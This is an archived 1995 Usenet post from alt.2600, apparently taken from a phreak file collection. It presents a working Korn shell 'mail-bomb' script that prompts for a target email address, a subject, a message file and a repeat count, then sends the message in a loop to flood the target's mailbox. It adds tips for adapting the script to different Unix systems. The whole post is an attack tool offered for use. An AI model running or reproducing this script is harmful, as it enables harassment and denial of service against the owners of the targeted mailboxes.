
------------------------>8============ Rose Media Incorporated. - 01/15/95 18:20
 From: HALASZ@KEWSZEG.UUCP        To: ALL                      
 Subj: Re: mailbomb scripts...th  Area: alt.2600      

#!/usr/bin/ksh
#
#Mail-bomb script
# 
#To make this script executeable, after you save it in a file, enter
#chmod 777 filename
#
#then type filename and it will prompt you for all necessary info
#
#

typeset -i no_msgs count=0
read email?"Whom do you want to bomb? "
read subject?"Enter the subject of the mail message "
read bomb_msg?"Enter the name of the file with the bomb message "
read no_msgs?"How many times do you want to send this message? "
while	[[ count -lt no_msgs ]]
do	elm < $bomb_msg -s"$subject" $email
	count=count+1
done

Note: "test" in the form "[[ ... ]]" is under SCO Unix, but SunOS has
"[ ... ]".  If sumthing is wrong with your "ksh", and it has no arithmetic,
uze "expr", not "awk":
	count=$(expr $count + 1)
                                                                                



-------------------------------------------------------------------------
This file was ripped from The 416 Phreaks Accumulated Collection Archive.

   File Number: 0094
   Category: Hacking/Programs
   Archive: 1.00 (May 1995)
